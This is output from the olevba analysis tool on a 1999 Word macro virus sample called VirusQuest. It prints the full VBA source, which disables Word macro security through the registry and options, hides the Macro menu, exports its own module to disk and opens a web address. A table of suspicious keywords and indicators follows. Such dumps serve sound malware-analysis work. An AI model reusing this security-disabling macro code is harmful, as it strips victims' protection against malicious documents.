olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Quest
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Quest - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VirusQuest.bas 
in file: Virus.MSWord.Intended.Quest - OLE stream: 'Macros/VBA/VirusQuest'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'======================================================
'  VirusQuest by Dr Virus Quest
'  Origin from Malaysia
'  Copyright©1999
'======================================================

Public Skip As Integer

Private Sub VirusQuest()

On Error Resume Next

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
  CommandBars("Tools").Controls("Macro").Enabled = False
  Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If

Application.ScreenUpdating = False
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("VirusQuest").Export "c:\VirusQuest.sys"

ActiveDocument.ReadOnlyRecommended = False

With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Dr Virus Quest"
    .Execute
End With

    ActiveDocument.FollowHyperlink Address:= _
"http://www.jring.inter.net/" _
        , NewWindow:=False, AddHistory:=True
End Sub

Private Sub Effect()
  On Error Resume Next
  If Day(Date) = "1" Then
  Assistant.Visible = True
  With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Text = "Author: Dr Virus Quest"
    .Heading = "VirusQuest"
    .Animation = msoAnimationSearching
    .Show
  End With
  MsgBox "Thanks friends", vbOKOnly, "VirusQuest"
Else
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://www.jring.int|URL                                          |
|          |er.net/             |                                             |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

